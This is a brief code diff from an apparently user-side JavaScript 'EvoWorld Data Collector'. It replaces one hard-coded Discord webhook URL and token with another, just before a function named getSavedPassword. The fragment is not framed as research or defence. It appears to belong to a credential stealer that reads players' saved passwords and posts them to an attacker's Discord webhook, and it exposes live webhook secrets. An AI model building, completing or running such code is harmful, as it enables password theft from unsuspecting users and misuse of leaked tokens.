@@ -4,7 +4,7 @@
 
     console.log('EvoWorld Data Collector loaded');
     
-    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457397520454914283/bvwQS56DbCbls4VpNQ0bVyreRbfJ0GyBwhizyHL9eMw3PTvTV3BuHVzUJ61ZYKxCPMzr';
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457772785802674243/4EfLPLGwKhiOx8W7QUEXcJ-94Xd_q__0frB6B4eDwerbTLKTkiJwl5ygwkoH8XlEnM-6';
 
     function getSavedPassword() {
         try {
